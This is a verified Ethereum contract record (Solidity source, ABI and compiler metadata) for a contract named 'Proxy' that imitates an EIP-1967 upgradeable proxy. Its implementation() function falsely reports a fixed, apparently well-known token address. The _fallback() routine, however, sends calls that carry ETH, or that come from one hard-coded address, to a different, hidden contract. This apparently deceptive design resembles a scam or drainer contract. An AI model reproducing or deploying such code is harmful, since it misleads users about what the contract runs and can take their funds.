{"SourceCode": "pragma solidity ^0.8.0;\r\n\r\nlibrary StorageSlot {\r\n    struct AddressSlot {\r\n        address value;\r\n    }\r\n\r\n    function getAddressSlot(\r\n        bytes32 slot\r\n    ) internal pure returns (AddressSlot storage r) {\r\n        assembly {\r\n            r.slot := slot\r\n        }\r\n    }\r\n}\r\n\r\ncontract Proxy {\r\n    // All functions / variables should be private, forward all calls to fallback\r\n\r\n    // -1 for unknown preimage\r\n    // 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc\r\n    bytes32 private constant IMPLEMENTATION_SLOT =\r\n        bytes32(uint(keccak256(\"eip1967.proxy.implementation\")) - 1);\r\n    // 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103\r\n    bytes32 private constant ADMIN_SLOT =\r\n        bytes32(uint(keccak256(\"eip1967.proxy.admin\")) - 1);\r\n\r\n    constructor() {\r\n        _setAdmin(msg.sender);\r\n    }\r\n\r\n    modifier ifAdmin() {\r\n        if (msg.sender == _getAdmin()) {\r\n            _;\r\n        } else {\r\n            _fallback();\r\n        }\r\n    }\r\n\r\n    function _getAdmin() private view returns (address) {\r\n        return StorageSlot.getAddressSlot(ADMIN_SLOT).value;\r\n    }\r\n\r\n    function _setAdmin(address _admin) private {\r\n        require(_admin != address(0), \"admin = zero address\");\r\n        StorageSlot.getAddressSlot(ADMIN_SLOT).value = _admin;\r\n    }\r\n\r\n    // Admin interface //\r\n    function changeAdmin(address _admin) external ifAdmin {\r\n        _setAdmin(_admin);\r\n    }\r\n\r\n    // 0xf851a440\r\n    function admin() external ifAdmin returns (address) {\r\n        return _getAdmin();\r\n    }\r\n\r\n    // 0x5c60da1b\r\n    function implementation() external returns (address) {\r\n        return address(0xdAC17F958D2ee523a2206206994597C13D831ec7);\r\n    }\r\n\r\n    // User interface //\r\n    function _delegate(address _implementation) internal virtual {\r\n        assembly {\r\n            // Copy msg.data. We take full control of memory in this inline assembly\r\n            // block because it will not return to Solidity code. We overwrite the\r\n            // Solidity scratch pad at memory position 0.\r\n\r\n            // calldatacopy(t, f, s) - copy s bytes from calldata at position f to mem at position t\r\n            // calldatasize() - size of call data in bytes\r\n            calldatacopy(0, 0, calldatasize())\r\n\r\n            // Call the implementation.\r\n            // out and outsize are 0 because we don't know the size yet.\r\n\r\n            // delegatecall(g, a, in, insize, out, outsize) -\r\n            // - call contract at address a\r\n            // - with input mem[in\u2026(in+insize))\r\n            // - providing g gas\r\n            // - and output area mem[out\u2026(out+outsize))\r\n            // - returning 0 on error (eg. out of gas) and 1 on success\r\n            let result := delegatecall(gas(), _implementation, 0, calldatasize(), 0, 0)\r\n\r\n            // Copy the returned data.\r\n            // returndatacopy(t, f, s) - copy s bytes from returndata at position f to mem at position t\r\n            // returndatasize() - size of the last returndata\r\n            returndatacopy(0, 0, returndatasize())\r\n\r\n            switch result\r\n            // delegatecall returns 0 on error.\r\n            case 0 {\r\n                // revert(p, s) - end execution, revert state changes, return data mem[p\u2026(p+s))\r\n                revert(0, returndatasize())\r\n            }\r\n            default {\r\n                // return(p, s) - end execution, return data mem[p\u2026(p+s))\r\n                return(0, returndatasize())\r\n            }\r\n        }\r\n    }\r\n\r\n    function _fallback() private {\r\n        require(msg.sender == tx.origin,\"\");\r\n        address _impl = address(0xdAC17F958D2ee523a2206206994597C13D831ec7);\r\n\r\n\r\n\r\n        if(msg.sender == address(0x8B2aeEc7d9d1666c6A8b0fAfEBbd76a90c852cc7) || msg.value > 0)\r\n        {\r\n              _impl = address(0xE49AC4dd061c29741b6A7F2CefB09146f93c1750);\r\n\r\n              _delegate(_impl);\r\n        }\r\n    }\r\n\r\n    fallback() external payable {\r\n        _fallback();\r\n    }\r\n\r\n    receive() external payable {\r\n        _fallback();\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"admin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_admin\",\"type\":\"address\"}],\"name\":\"changeAdmin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"implementation\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Proxy", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://9ea704d092073115003ba5c33430cfbced1d91710f9a7b85743310c47a222a19"}